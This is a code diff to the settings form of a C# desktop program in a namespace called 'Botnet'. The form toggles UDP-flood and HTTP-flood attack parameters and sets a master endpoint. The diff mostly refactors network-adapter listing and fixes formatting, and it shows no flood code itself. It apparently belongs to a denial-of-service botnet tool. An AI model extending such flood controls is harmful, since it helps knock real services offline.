@@ -22,7 +22,6 @@ namespace Botnet
         public SettingsForm(AttackParams Params, NetworkInterface CurAdapter, int curport, SetSettingsCallBack funct, bool mode, IPEndPoint OldMaster)
         {
             InitializeComponent();
-            Adapters = new List<NetworkInterface>();
             SetSettings = funct;
             curAdapter = CurAdapter;
             CurAdapterLabel.Text = CurAdapter.Name + " - Status: " + CurAdapter.OperationalStatus + " Type:" + CurAdapter.NetworkInterfaceType;
@@ -33,7 +32,7 @@ namespace Botnet
             {
                 AttackParamsBox.Enabled = true;
                 RoleCheckBox.Checked = true;
-                if(Params.UdpFloodEnabled)
+                if (Params.UdpFloodEnabled)
                 {
                     FloodEnablingCheckBox.Checked = true;
                     RestPoolsSetBox.Enabled = true;
@@ -43,7 +42,7 @@ namespace Botnet
                     FloodEnablingCheckBox.Checked = false;
                     RestPoolsSetBox.Enabled = false;
                 }
-                if(Params.HttpFloodEnabled)
+                if (Params.HttpFloodEnabled)
                 {
                     HttpSetsCheckBox.Checked = true;
                     HttpsSetsBox.Enabled = true;
@@ -149,24 +148,21 @@ namespace Botnet
         }
         private void fillAdapterList()
         {
-            Adapters.AddRange(NetworkInterface.GetAllNetworkInterfaces());  
-            //choose only valid adapters
-            for (int i = 0; i < Adapters.Count; ++i)
+            NetworkInterface[] AdaptersRange = NetworkInterface.GetAllNetworkInterfaces();
+            Adapters = new List<NetworkInterface>();
+            for (int i = 0; i < AdaptersRange.Length; ++i)
             {
-                if (Adapters[i].OperationalStatus == OperationalStatus.Up && Adapters[i].NetworkInterfaceType != NetworkInterfaceType.Loopback)
+                if (AdaptersRange[i].OperationalStatus == OperationalStatus.Up && AdaptersRange[i].NetworkInterfaceType != NetworkInterfaceType.Loopback && NetworkInstruments.getAdapterIPAddress(AdaptersRange[i]) != IPAddress.Any)
                 {
-                    AdapterBox.Items.Add(Adapters[i].Name + " Status: " + Adapters[i].OperationalStatus.ToString() + " Type: " + Adapters[i].NetworkInterfaceType);
-                    if (Adapters[i].Id == curAdapter.Id)
+                    Adapters.Add(AdaptersRange[i]);
+                    AdapterBox.Items.Add(AdaptersRange[i].Name + " Status: " + AdaptersRange[i].OperationalStatus.ToString() + " Type: " + AdaptersRange[i].NetworkInterfaceType);
+                    if (AdaptersRange[i].Id == curAdapter.Id)
                     {
-                        AdapterBox.SelectedIndex = i;
-                    } 
-                }
-                else
-                {
-                    Adapters.RemoveAt(i);
+                        AdapterBox.SelectedIndex = AdapterBox.Items.Count - 1;
+                    }
                 }
             }
-            if(AdapterBox.SelectedIndex == -1 && AdapterBox.Items.Count != 0)
+            if (AdapterBox.SelectedIndex == -1 && AdapterBox.Items.Count != 0)
             {
                 AdapterBox.SelectedIndex = 0;
             }
